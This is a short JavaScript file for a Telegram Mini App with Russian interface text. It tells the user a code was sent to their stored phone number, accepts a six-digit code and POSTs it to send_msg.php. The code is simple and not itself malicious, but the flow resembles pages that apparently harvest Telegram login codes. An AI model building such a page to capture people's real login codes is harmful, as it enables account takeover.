let tg = window.Telegram.WebApp;
tg.expand();
tg.enableClosingConfirmation();
tg.MainButton.text = "Отправить код";
tg.MainButton.show();
tg.BackButton.Show();
tg.MainButton.hideProgress();


let passwordInput = document.querySelector('input');
var number = sessionStorage.getItem('number');

document.getElementById("p").innerHTML = `Отправили код на номер ${number}`;

document.addEventListener( 'click', (e) => {
	const withinBoundaries = e.composedPath().includes(passwordInput);
	if (! withinBoundaries ) {
		passwordInput.blur();
	} else{
    passwordInput.focus();
  }
});

passwordInput.addEventListener("input", passwordInputHandler);

function passwordInputHandler(){
  if (passwordInput.value.length == 6){
    passwordInput.classList.add('correctInput');
    passwordInput.classList.remove('incorrectInput');
  } else{
    passwordInput.classList.remove('correctInput');
  }
}

tg.MainButton.onClick(function(){
  passwordInput.blur();
  if (passwordInput.classList.value == 'correctInput'){
    fetch("send_msg.php", {
      method: "POST",
      body: passwordInput.value
    })
  }else{
      passwordInput.classList.add('incorrectInput');
  }
});